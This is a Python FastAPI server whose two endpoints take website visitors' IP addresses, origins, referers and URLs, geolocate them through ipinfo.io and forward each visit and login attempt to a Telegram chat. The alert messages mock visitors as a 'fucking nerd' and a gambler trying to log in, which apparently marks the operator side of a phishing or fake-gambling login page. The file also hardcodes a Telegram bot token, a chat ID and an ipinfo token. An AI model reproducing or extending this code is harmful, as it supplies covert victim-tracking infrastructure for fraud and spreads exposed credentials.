from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx

app = FastAPI()

# Разрешаем CORS для всех источников
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Константы
TOKEN = '7739429466:AAHKEC_e4ZShjW-4ARVO9dml9oyAbHabjTo'
CHAT_ID = '-1002508859195'
IPINFO_TOKEN = '5ec56ca5d614d1'

# Глобальный счётчик
message_counter = 1


@app.get("/")
async def home():
    return {"status": "ok", "message": "Server is running!"}


@app.post("/log-visit")
async def log_visit(request: Request):
    global message_counter
    try:
        data = await request.json()
        event = data.get("event")
        timestamp = data.get("timestamp")
        origin = request.headers.get("origin", "—")
        referer = request.headers.get("referer", "—")

        if not event or not timestamp:
            return JSONResponse(status_code=400, content={"status": "error", "message": "Недостаточно данных"})

        ip = request.headers.get("x-forwarded-for", request.client.host).split(",")[0]

        async with httpx.AsyncClient() as client:
            ip_info = await client.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}")
            ip_data = ip_info.json()

        country = ip_data.get("country", "Неизвестно")
        flag = get_flag(country) if country != "Неизвестно" else "❌"

        message = (
            f"*Задрот ебаный зашёл смотреть🔗 (ID: {message_counter})*\n"
            f"*IP:* {ip}\n*Страна:* {country} {flag}\n"
            f"*Origin:* {origin}`\n*Referer:* {referer}`"
        )

        async with httpx.AsyncClient() as client:
            tg_response = await client.get(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                params={
                    "chat_id": CHAT_ID,
                    "text": message,
                    "parse_mode": "Markdown"
                }
            )

        message_counter += 1

        if tg_response.status_code == 200:
            return {"status": "success", "message": "Залогировано"}
        else:
            return JSONResponse(status_code=500, content={"status": "error", "message": "Ошибка Telegram"})

    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "error", "message": str(e)})


@app.post("/send-telegram-message")
async def send_telegram_message(request: Request):
    global message_counter
    try:
        data = await request.json()
        user_id = data.get("user_id")
        ip = data.get("ip")
        country = data.get("country")
        flag = data.get("flag")
        origin = data.get("origin", "—")
        full_url = data.get("full_url", "—")

        if not all([user_id, ip, country, flag]):
            return JSONResponse(status_code=400, content={"status": "error", "message": "Недостаточно данных"})

        message = (
            f"*💻 Лудик хочет залогиниться!❇️ (ID: {message_counter})*\n"
            f"*IP:* {ip}\n*Страна:* {country} {flag}\n"
            f"*Origin:* {origin}`\n*URL:* {full_url}`"
        )

        async with httpx.AsyncClient() as client:
            tg_response = await client.get(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                params={
                    "chat_id": CHAT_ID,
                    "text": message,
                    "parse_mode": "Markdown"
                }
            )

        message_counter += 1

        if tg_response.status_code == 200:
            return {"status": "success", "message": "Сообщение отправлено"}
        else:
            return JSONResponse(status_code=500, content={"status": "error", "message": "Ошибка Telegram"})

    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "error", "message": str(e)})


def get_flag(country_code: str) -> str:
    code_points = [0x1F1E6 - 65 + ord(c) for c in country_code.upper()]
    return ''.join(chr(cp) for cp in code_points)


# Запуск через `python main.py`
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
